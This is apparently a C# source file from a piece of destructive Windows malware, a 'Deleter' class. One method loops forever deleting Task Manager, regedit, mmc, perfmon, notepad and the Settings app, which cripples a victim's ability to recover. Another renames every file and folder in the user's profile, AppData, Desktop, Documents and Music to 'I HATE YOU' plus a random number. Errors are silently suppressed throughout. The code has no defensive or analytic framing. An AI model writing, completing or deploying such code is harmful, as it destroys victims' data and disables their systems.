using Microsoft.VisualBasic.FileIO;
using System;
using System.IO;
using System.Threading.Tasks;

namespace _6968617465796f750d0a.Services.FileManager
{
    internal class Deleter
    {

        private FileManager.Permissions sysfiles = new FileManager.Permissions();

        private protected string[] PathesToFiles =
{
            @"C:\Windows\System32\perfmon.exe",
            @"C:\Windows\notepad.exe",
            @"C:\Windows\System32\mmc.exe",
            @"C:\Windows\regedit.exe",
            @"C:\Windows\System32\taskmgr.exe",
            @"C:\Windows\ImmersiveControlPanel\SystemSettings.exe"
        };

        private protected string[] PathesToFiles2 =
        {
            @"C:\Users", @$"C:\Users\{Environment.UserName}", @$"C:\Users\{Environment.UserName}\AppData",
            @$"C:\Users\{Environment.UserName}\AppData\Roaming", @$"C:\Users\{Environment.UserName}\Desktop",
            @$"C:\Users\{Environment.UserName}\Documents", @$"C:\Users\{Environment.UserName}\Music"
        };

        public async void Execute()
        {

            sysfiles.Execute();

            await Task.Delay(5000);

            while (true)
            {
                foreach (string path in PathesToFiles)
                {
                    try { File.Delete(path); } catch { }
                }
                await Task.Delay(4000);
            }

        }

        public async void RenameExecute()
        {

            foreach (string Path in PathesToFiles2)
            {

                try
                {
                    string[] Files = Directory.GetFiles(Path); foreach (string File in Files)
                        try { FileSystem.RenameFile(File, $"I HATE YOU {new Random().Next(99999999)}"); } catch { }
                }
                catch { }
                try
                {
                    string[] Directories = Directory.GetDirectories(Path); foreach (string Directory in Directories)
                        try { FileSystem.RenameDirectory(Directory, $"I HATE YOU {new Random().Next(99999999)}"); } catch { }
                }
                catch { }

                await System.Threading.Tasks.Task.Delay(10);

            }

        }

    }
}
